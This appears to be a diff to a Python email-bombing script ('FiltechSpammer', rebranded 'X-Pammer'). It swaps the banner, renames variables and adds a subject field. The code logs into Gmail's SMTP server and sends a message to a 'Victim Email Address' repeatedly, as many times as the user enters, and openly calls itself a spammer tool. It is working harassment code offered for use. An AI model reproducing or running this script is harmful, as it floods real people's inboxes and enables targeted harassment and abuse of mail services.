@@ -18,23 +18,15 @@ filtechColorLightGrey = '\033[40m'
 
 if len(sys.argv) < 2:
     os.system("cls||clear")
-    sys.stdout.write(filtechColorGrey+"""
-                                    $$$$$$$$\ $$$$$$\ $$\    $$$$$$$$\ $$$$$$$$\  $$$$$$\  $$\   $$\                                 
-                                    $$  _____|\_$$  _|$$ |   \__$$  __|$$  _____|$$  __$$\ $$ |  $$ |                                
-                                    $$ |        $$ |  $$ |      $$ |   $$ |      $$ /  \__|$$ |  $$ |                                
-                                    $$$$$\      $$ |  $$ |      $$ |   $$$$$\    $$ |      $$$$$$$$ |                                
-                                    $$  __|     $$ |  $$ |      $$ |   $$  __|   $$ |      $$  __$$ |                                
-                                    $$ |        $$ |  $$ |      $$ |   $$ |      $$ |  $$\ $$ |  $$ |                                
-                                    $$ |      $$$$$$\ $$$$$$$$\ $$ |   $$$$$$$$\ \$$$$$$  |$$ |  $$ |                                
-                                    \__|      \______|\________|\__|   \________| \______/ \__|  \__|                                
-$$$$$$$$\ $$\      $$\  $$$$$$\  $$$$$$\ $$\              $$$$$$\  $$$$$$$\   $$$$$$\  $$\      $$\ $$\      $$\ $$$$$$$$\ $$$$$$$\  
-$$  _____|$$$\    $$$ |$$  __$$\ \_$$  _|$$ |            $$  __$$\ $$  __$$\ $$  __$$\ $$$\    $$$ |$$$\    $$$ |$$  _____|$$  __$$\ 
-$$ |      $$$$\  $$$$ |$$ /  $$ |  $$ |  $$ |            $$ /  \__|$$ |  $$ |$$ /  $$ |$$$$\  $$$$ |$$$$\  $$$$ |$$ |      $$ |  $$ |
-$$$$$\    $$\$$\$$ $$ |$$$$$$$$ |  $$ |  $$ |            \$$$$$$\  $$$$$$$  |$$$$$$$$ |$$\$$\$$ $$ |$$\$$\$$ $$ |$$$$$\    $$$$$$$  |
-$$  __|   $$ \$$$  $$ |$$  __$$ |  $$ |  $$ |             \____$$\ $$  ____/ $$  __$$ |$$ \$$$  $$ |$$ \$$$  $$ |$$  __|   $$  __$$< 
-$$ |      $$ |\$  /$$ |$$ |  $$ |  $$ |  $$ |            $$\   $$ |$$ |      $$ |  $$ |$$ |\$  /$$ |$$ |\$  /$$ |$$ |      $$ |  $$ |
-$$$$$$$$\ $$ | \_/ $$ |$$ |  $$ |$$$$$$\ $$$$$$$$\       \$$$$$$  |$$ |      $$ |  $$ |$$ | \_/ $$ |$$ | \_/ $$ |$$$$$$$$\ $$ |  $$ |
-\________|\__|     \__|\__|  \__|\______|\________|       \______/ \__|      \__|  \__|\__|     \__|\__|     \__|\________|\__|  \__|
+    sys.stdout.write(filtechColorGrey+"""         
+
+██╗  ██╗     ██████╗  █████╗ ███╗   ███╗███╗   ███╗███████╗██████╗ 
+╚██╗██╔╝     ██╔══██╗██╔══██╗████╗ ████║████╗ ████║██╔════╝██╔══██╗
+ ╚███╔╝█████╗██████╔╝███████║██╔████╔██║██╔████╔██║█████╗  ██████╔╝
+ ██╔██╗╚════╝██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║██╔══╝  ██╔══██╗
+██╔╝ ██╗     ██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║███████╗██║  ██║
+╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
+    Created by Pseudo-X [2019 Spammer Tool - Re-developed ]
 
 \n"""+filtechColorLightGrey)
 
@@ -45,11 +37,13 @@ else:
 print("[ How to use in Computer : python FiltechSpammer.py ] \n")
 print("[ How to use in Termux : python2 FiltechSpammer.py ] \n")
 
-filtechEmail = raw_input("Please Enter your Email Address Here :")
-filtechPassword = getpass.getpass("Enter your Password :")
-filtechVictim = raw_input("Victim Email Address : ")
-filtechMessage = raw_input("Your Message to your Victim : ")
-filtechSpam = int(input("Spam Count :"))
+sudoEmail = input("Please Enter your Email Address Here :")
+sudoPassword = getpass.getpass("Enter your Password :")
+sudoVictim = input("Victim Email Address : ")
+sudoMessage = input("Your Message to your Victim : ")
+sudoSubject = input("Enter Subject : ")
+sudoMessageSubmit = 'Subject: {}\n\n{}'.format(sudoSubject, sudoMessage)
+sudoSpam = int(input("Spam Count :"))
 
 try:
     filtech_smtp = 'smtp.gmail.com'
@@ -58,22 +52,22 @@ try:
     filtechServer = smtplib.SMTP(filtech_smtp,filtechPort)
     filtechServer.ehlo()
     filtechServer.starttls()
-    filtechServer.login(filtechEmail, filtechPassword)
+    filtechServer.login(sudoEmail, sudoPassword)
 
     print("[-] // Spamming .......... Please Wait ...... [-] \n")
 
     filtech = 0
-    while filtech < filtechSpam:
+    while filtech < sudoSpam:
         filtech += 1
-        filtechServer.sendmail(filtechEmail,filtechVictim, filtechMessage)
+        filtechServer.sendmail(sudoEmail, sudoVictim, sudoMessageSubmit)
     if filtech == 1:
-        print(" %dst Email Successfully Sent!" % (filtech))
+        print(" %dst Email Sent Successfully!" % (filtech))
     elif filtech == 2:
-        print(" %dnd Email Successfully Sent!" % (filtech))
+        print(" %dnd Email Sent Successfully!" % (filtech))
     elif filtech == 3:
-        print(" %drd Email Successfully Sent!" % (filtech))
+        print(" %drd Email Sent Successfully!" % (filtech))
     else:
-        print(" %dth Email Successfully Sent!" % (filtech))
+        print(" %dth Email Sent Successfully!" % (filtech))
     sys.stdout.flush()
     filtechServer.quit()
     print("Spamming Done!")
@@ -82,6 +76,7 @@ except KeyboardInterrupt:
     print()
     print("Canceled [X]")
     sys.exit()
+
 except smtplib.SMTPAuthenticationError:
     print("The username or password did you entered is incorrect")
     print("or Check your Gmail option if 'Less Secure' is enable to use this Spammer. ")
